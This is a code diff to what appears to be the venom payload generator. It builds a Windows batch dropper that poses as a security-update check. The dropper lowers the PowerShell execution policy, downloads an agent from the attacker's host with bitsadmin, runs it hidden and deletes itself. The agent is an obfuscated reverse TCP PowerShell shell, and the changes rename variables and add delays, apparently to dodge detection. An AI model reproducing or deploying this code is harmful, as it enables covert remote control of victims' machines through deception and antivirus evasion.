@@ -12366,7 +12366,7 @@ cat << !
     ─────────
     DESCRIPTION        : Reverse Powershell Shell (hex|PSrevStr)
     TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    LOLBin             : Powershell (DownloadFile)
+    LOLBin             : bitsadmin (DownloadFile)
     DROPPER EXTENSION  : .CRDOWNLOAD.BAT (MITRE T1036)
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : AVAILABLE
@@ -13132,7 +13132,7 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
-   echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+   echo "powershell -w 1 bitsadmin /tRaNsFeR googlestore /dOwNlOaD /priority foreground http://$lhost/$NaM.ps1 $rpath\\$NaM.ps1" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution
    echo "Exit" >> $IPATH/output/$Drop.$ext.bat
@@ -13145,7 +13145,7 @@ else
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
-   echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+   echo "powershell -w 1 bitsadmin /tRaNsFeR googlestore /dOwNlOaD /priority foreground http://$lhost/$NaM.ps1 $rpath\\$NaM.ps1" >> $IPATH/output/$Drop.$ext.bat
    ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
@@ -13179,21 +13179,22 @@ if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
    xterm -T " Reversing Original String (ip addr)" -geometry 110x23 -e "rev <<< \"$lhost\" > /tmp/reverse.txt"
    revtcpip=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt > /dev/nul 2>&1
    
-   echo "${BlueF}[☠]${white} Obfuscated ip address (rev):${GreenF}$revtcpip${white}";sleep 2
+   echo "${BlueF}[☠]${white} Obfuscated ip address (rev): ${GreenF}$revtcpip${white}";sleep 2
    ## Build Reverse TCP Powershell Shell (PSrevStr obfuscated).
    echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
    echo "<#" > $IPATH/output/$NaM.ps1
-   echo "Obfuscated (rev) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
+   echo "Obfuscated (rev) Reverse TCP powershell Shell" >> $IPATH/output/$NaM.ps1
    echo "Framework: venom v1.0.17 (shinigami)" >> $IPATH/output/$NaM.ps1
    echo "#>" >> $IPATH/output/$NaM.ps1
    echo "" >> $IPATH/output/$NaM.ps1
-   echo "\$Vault = \"tneilCpcT.stekcoS.teN\";\$CertPem = \$Vault.ToCharArray();" >> $IPATH/output/$NaM.ps1
-   echo "[Array]::Reverse(\$CertPem);\$CmdLine = (\$CertPem -Join '');" >> $IPATH/output/$NaM.ps1
-   echo "\$Cofre = \"$revtcpip\";\$Chave = \$Cofre.ToCharArray();" >> $IPATH/output/$NaM.ps1
-   echo "[Array]::Reverse(\$Chave);\$RSAx504 = (\$Chave -Join '');" >> $IPATH/output/$NaM.ps1
+   echo "\$MyVault = \"tneilCpcT.stekcoS.teN\";\$CertificatePem = \$MyVault.ToCharArray();" >> $IPATH/output/$NaM.ps1
+   echo "[Array]::Reverse(\$CertificatePem);\$CmdLine = (\$CertificatePem -Join '');" >> $IPATH/output/$NaM.ps1
+   echo "\$Cofre = \"$revtcpip\";\$MyChave = \$Cofre.ToCharArray();" >> $IPATH/output/$NaM.ps1
+   echo "[Array]::Reverse(\$MyChave);\$RSAx504 = (\$MyChave -Join '');" >> $IPATH/output/$NaM.ps1
+   echo "Start-Sleep -Milliseconds 150" >> $IPATH/output/$NaM.ps1
    echo "" >> $IPATH/output/$NaM.ps1
-   echo "\$proxy = New-Object System.\$CmdLine(\$RSAx504, $lport);" >> $IPATH/output/$NaM.ps1
-   echo "\$DataRaw = \$proxy.GetStream();" >> $IPATH/output/$NaM.ps1
+   echo "\$TORproxy = New-Object System.\$CmdLine(\$RSAx504, $lport);" >> $IPATH/output/$NaM.ps1
+   echo "\$DataRaw = \$TORproxy.GetStream();" >> $IPATH/output/$NaM.ps1
    echo "[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
    echo "" >> $IPATH/output/$NaM.ps1
    echo "while((\$iO = \$DataRaw.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
@@ -13204,7 +13205,7 @@ if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
    echo "   \$DataRaw.Write(\$sendbyte,0,\$sendbyte.Length);" >> $IPATH/output/$NaM.ps1
    echo "   \$DataRaw.Flush();" >> $IPATH/output/$NaM.ps1
    echo "}" >> $IPATH/output/$NaM.ps1
-   echo "\$proxy.Close();" >> $IPATH/output/$NaM.ps1
+   echo "\$TORproxy.Close();" >> $IPATH/output/$NaM.ps1
 
 else
 
